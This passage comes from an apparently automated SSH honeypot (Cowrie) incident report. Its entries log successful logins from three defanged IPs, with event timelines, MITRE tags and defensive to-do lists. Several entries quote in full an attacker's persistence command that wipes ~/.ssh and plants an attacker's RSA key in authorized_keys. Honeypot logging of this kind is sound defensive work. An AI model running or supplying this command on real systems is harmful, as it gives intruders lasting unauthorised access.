| `2026-04-10 14:12:44` | `cowrie.command.failed` |
| `2026-04-10 14:12:44` | `cowrie.log.closed` |
| `2026-04-10 14:12:44` | `cowrie.session.params` |
| `2026-04-10 14:12:44` | `cowrie.command.input` |
| `2026-04-10 14:12:44` | `cowrie.session.file_download` |
| `2026-04-10 14:12:44` | `cowrie.log.closed` |
| `2026-04-10 14:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6db2aba8b18

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:12 |
| **Last Seen** | 2026-04-10 14:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:12:46` | `cowrie.session.connect` |
| `2026-04-10 14:12:46` | `cowrie.client.version` |
| `2026-04-10 14:12:46` | `cowrie.client.kex` |
| `2026-04-10 14:12:46` | `cowrie.login.success` |
| `2026-04-10 14:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6305d4077f7c

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-04-10 14:13 |
| **Last Seen** | 2026-04-10 14:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:13:55` | `cowrie.session.connect` |
| `2026-04-10 14:13:55` | `cowrie.client.version` |
| `2026-04-10 14:13:55` | `cowrie.client.kex` |
| `2026-04-10 14:13:55` | `cowrie.login.success` |
| `2026-04-10 14:13:56` | `cowrie.session.params` |
| `2026-04-10 14:13:56` | `cowrie.command.input` |
| `2026-04-10 14:13:56` | `cowrie.command.failed` |
| `2026-04-10 14:13:56` | `cowrie.log.closed` |
| `2026-04-10 14:13:56` | `cowrie.session.params` |
| `2026-04-10 14:13:56` | `cowrie.command.input` |
| `2026-04-10 14:13:56` | `cowrie.session.file_download` |
| `2026-04-10 14:13:56` | `cowrie.log.closed` |
| `2026-04-10 14:13:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5371c1cba53e

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-04-10 14:13 |
| **Last Seen** | 2026-04-10 14:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:13:58` | `cowrie.session.connect` |
| `2026-04-10 14:13:58` | `cowrie.client.version` |
| `2026-04-10 14:13:58` | `cowrie.client.kex` |
| `2026-04-10 14:13:59` | `cowrie.login.success` |
| `2026-04-10 14:13:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5e31e14ee38

| Field | Detail |
|---|---|
| **Source IP** | `185.239.84[.]249` |
| **First Seen** | 2026-04-10 14:19 |
| **Last Seen** | 2026-04-10 14:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:19:16` | `cowrie.session.connect` |
| `2026-04-10 14:19:16` | `cowrie.client.version` |
| `2026-04-10 14:19:16` | `cowrie.client.kex` |
| `2026-04-10 14:19:17` | `cowrie.login.success` |
| `2026-04-10 14:19:18` | `cowrie.session.params` |
| `2026-04-10 14:19:18` | `cowrie.command.input` |
| `2026-04-10 14:19:18` | `cowrie.command.failed` |
| `2026-04-10 14:19:18` | `cowrie.log.closed` |
| `2026-04-10 14:19:18` | `cowrie.session.params` |
| `2026-04-10 14:19:18` | `cowrie.command.input` |
| `2026-04-10 14:19:18` | `cowrie.session.file_download` |
| `2026-04-10 14:19:18` | `cowrie.log.closed` |
| `2026-04-10 14:19:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.84[.]249` to AbuseIPDB if not already reported
- [ ] Block `185.239.84[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-479e7a3d1601

| Field | Detail |
|---|---|
| **Source IP** | `185.239.84[.]249` |
| **First Seen** | 2026-04-10 14:19 |
| **Last Seen** | 2026-04-10 14:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:19:21` | `cowrie.session.connect` |
| `2026-04-10 14:19:21` | `cowrie.client.version` |
| `2026-04-10 14:19:21` | `cowrie.client.kex` |
| `2026-04-10 14:19:22` | `cowrie.login.success` |
| `2026-04-10 14:19:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.84[.]249` to AbuseIPDB if not already reported
- [ ] Block `185.239.84[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3db251365b27

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:19 |
| **Last Seen** | 2026-04-10 14:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:19:49` | `cowrie.session.connect` |
| `2026-04-10 14:19:49` | `cowrie.client.version` |
| `2026-04-10 14:19:49` | `cowrie.client.kex` |
| `2026-04-10 14:19:49` | `cowrie.login.success` |
| `2026-04-10 14:19:49` | `cowrie.session.params` |
| `2026-04-10 14:19:49` | `cowrie.command.input` |
| `2026-04-10 14:19:49` | `cowrie.command.failed` |
| `2026-04-10 14:19:49` | `cowrie.log.closed` |
| `2026-04-10 14:19:49` | `cowrie.session.params` |
| `2026-04-10 14:19:49` | `cowrie.command.input` |
| `2026-04-10 14:19:49` | `cowrie.session.file_download` |
| `2026-04-10 14:19:49` | `cowrie.log.closed` |
| `2026-04-10 14:19:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0b0cb45a799

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:19 |
| **Last Seen** | 2026-04-10 14:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:19:51` | `cowrie.session.connect` |
| `2026-04-10 14:19:51` | `cowrie.client.version` |
| `2026-04-10 14:19:51` | `cowrie.client.kex` |
| `2026-04-10 14:19:51` | `cowrie.login.success` |
| `2026-04-10 14:19:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3b5b54d266f

| Field | Detail |
|---|---|
| **Source IP** | `185.239.84[.]249` |
| **First Seen** | 2026-04-10 14:21 |
| **Last Seen** | 2026-04-10 14:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:21:26` | `cowrie.session.connect` |
| `2026-04-10 14:21:26` | `cowrie.client.version` |
| `2026-04-10 14:21:26` | `cowrie.client.kex` |
| `2026-04-10 14:21:27` | `cowrie.login.success` |
| `2026-04-10 14:21:28` | `cowrie.session.params` |
| `2026-04-10 14:21:28` | `cowrie.command.input` |
| `2026-04-10 14:21:28` | `cowrie.command.failed` |
| `2026-04-10 14:21:28` | `cowrie.log.closed` |
| `2026-04-10 14:21:29` | `cowrie.session.params` |
| `2026-04-10 14:21:29` | `cowrie.command.input` |
| `2026-04-10 14:21:29` | `cowrie.session.file_download` |
| `2026-04-10 14:21:29` | `cowrie.log.closed` |
| `2026-04-10 14:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.84[.]249` to AbuseIPDB if not already reported
- [ ] Block `185.239.84[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bb3cdd4655d

| Field | Detail |
|---|---|
| **Source IP** | `185.239.84[.]249` |
| **First Seen** | 2026-04-10 14:21 |
| **Last Seen** | 2026-04-10 14:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:21:33` | `cowrie.session.connect` |
| `2026-04-10 14:21:33` | `cowrie.client.version` |
| `2026-04-10 14:21:33` | `cowrie.client.kex` |
| `2026-04-10 14:21:34` | `cowrie.login.success` |
| `2026-04-10 14:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.84[.]249` to AbuseIPDB if not already reported
- [ ] Block `185.239.84[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca0a79b46e1f

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:21 |
| **Last Seen** | 2026-04-10 14:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:21:38` | `cowrie.session.connect` |
| `2026-04-10 14:21:38` | `cowrie.client.version` |
| `2026-04-10 14:21:38` | `cowrie.client.kex` |
| `2026-04-10 14:21:38` | `cowrie.login.success` |
| `2026-04-10 14:21:38` | `cowrie.session.params` |
| `2026-04-10 14:21:38` | `cowrie.command.input` |
| `2026-04-10 14:21:38` | `cowrie.command.failed` |
| `2026-04-10 14:21:38` | `cowrie.log.closed` |
| `2026-04-10 14:21:38` | `cowrie.session.params` |
| `2026-04-10 14:21:38` | `cowrie.command.input` |
| `2026-04-10 14:21:38` | `cowrie.session.file_download` |
| `2026-04-10 14:21:38` | `cowrie.log.closed` |
| `2026-04-10 14:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61928ac86c8e

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:21 |
| **Last Seen** | 2026-04-10 14:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:21:39` | `cowrie.session.connect` |
| `2026-04-10 14:21:39` | `cowrie.client.version` |
| `2026-04-10 14:21:39` | `cowrie.client.kex` |
| `2026-04-10 14:21:40` | `cowrie.login.success` |
| `2026-04-10 14:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84bfa3dff138

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-04-10 14:26 |
| **Last Seen** | 2026-04-10 14:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:26:13` | `cowrie.session.connect` |
| `2026-04-10 14:26:13` | `cowrie.client.version` |
| `2026-04-10 14:26:13` | `cowrie.client.kex` |
| `2026-04-10 14:26:14` | `cowrie.login.success` |
| `2026-04-10 14:26:14` | `cowrie.session.params` |
| `2026-04-10 14:26:14` | `cowrie.command.input` |
| `2026-04-10 14:26:14` | `cowrie.command.failed` |
| `2026-04-10 14:26:14` | `cowrie.log.closed` |
| `2026-04-10 14:26:15` | `cowrie.session.params` |
| `2026-04-10 14:26:15` | `cowrie.command.input` |
| `2026-04-10 14:26:15` | `cowrie.session.file_download` |
| `2026-04-10 14:26:15` | `cowrie.log.closed` |
| `2026-04-10 14:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e07e7e1dfda

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-04-10 14:26 |
| **Last Seen** | 2026-04-10 14:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:26:17` | `cowrie.session.connect` |
| `2026-04-10 14:26:17` | `cowrie.client.version` |
| `2026-04-10 14:26:17` | `cowrie.client.kex` |
| `2026-04-10 14:26:17` | `cowrie.login.success` |
| `2026-04-10 14:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-191f3708a455

| Field | Detail |
|---|---|
| **Source IP** | `185.239.84[.]249` |
| **First Seen** | 2026-04-10 14:27 |
| **Last Seen** | 2026-04-10 14:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:27:33` | `cowrie.session.connect` |
| `2026-04-10 14:27:33` | `cowrie.client.version` |
| `2026-04-10 14:27:33` | `cowrie.client.kex` |
| `2026-04-10 14:27:34` | `cowrie.login.success` |
| `2026-04-10 14:27:34` | `cowrie.session.params` |
| `2026-04-10 14:27:34` | `cowrie.command.input` |
| `2026-04-10 14:27:34` | `cowrie.command.failed` |
| `2026-04-10 14:27:34` | `cowrie.log.closed` |
| `2026-04-10 14:27:35` | `cowrie.session.params` |
| `2026-04-10 14:27:35` | `cowrie.command.input` |
| `2026-04-10 14:27:35` | `cowrie.session.file_download` |
| `2026-04-10 14:27:35` | `cowrie.log.closed` |
| `2026-04-10 14:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.84[.]249` to AbuseIPDB if not already reported
- [ ] Block `185.239.84[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a48757725666

| Field | Detail |
|---|---|
| **Source IP** | `185.239.84[.]249` |
| **First Seen** | 2026-04-10 14:27 |
| **Last Seen** | 2026-04-10 14:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:27:36` | `cowrie.session.connect` |
| `2026-04-10 14:27:36` | `cowrie.client.version` |
| `2026-04-10 14:27:36` | `cowrie.client.kex` |
| `2026-04-10 14:27:37` | `cowrie.login.success` |
| `2026-04-10 14:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.84[.]249` to AbuseIPDB if not already reported
- [ ] Block `185.239.84[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1c3d6a9f04f

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:28 |
| **Last Seen** | 2026-04-10 14:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:28:42` | `cowrie.session.connect` |
| `2026-04-10 14:28:42` | `cowrie.client.version` |
| `2026-04-10 14:28:42` | `cowrie.client.kex` |
| `2026-04-10 14:28:42` | `cowrie.login.success` |
| `2026-04-10 14:28:42` | `cowrie.session.params` |
| `2026-04-10 14:28:42` | `cowrie.command.input` |
| `2026-04-10 14:28:42` | `cowrie.command.failed` |
| `2026-04-10 14:28:42` | `cowrie.log.closed` |
| `2026-04-10 14:28:42` | `cowrie.session.params` |
| `2026-04-10 14:28:42` | `cowrie.command.input` |
| `2026-04-10 14:28:42` | `cowrie.session.file_download` |
| `2026-04-10 14:28:42` | `cowrie.log.closed` |
| `2026-04-10 14:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8e2cae945b6

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:28 |
| **Last Seen** | 2026-04-10 14:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:28:44` | `cowrie.session.connect` |
| `2026-04-10 14:28:44` | `cowrie.client.version` |
| `2026-04-10 14:28:44` | `cowrie.client.kex` |
| `2026-04-10 14:28:44` | `cowrie.login.success` |
| `2026-04-10 14:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbc25adaccec

